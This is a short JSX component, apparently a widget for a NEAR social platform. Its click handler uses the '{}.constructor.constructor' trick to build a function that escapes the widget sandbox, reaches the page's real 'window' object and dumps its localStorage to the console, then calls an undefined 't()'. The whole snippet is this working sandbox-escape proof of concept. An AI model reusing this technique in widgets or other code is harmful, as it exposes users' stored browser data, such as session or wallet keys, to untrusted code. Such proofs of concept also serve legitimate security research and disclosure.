return (
  <div
    onClick={(e) => {
      const f = {}.constructor.constructor;
      const wfunc = f("return window");
      const window = wfunc();
      console.log(window.localStorage);
      t();
    }}
  >
    <Widget src={homepage ?? "mob.near/widget/Welcome"} />
  </div>
);
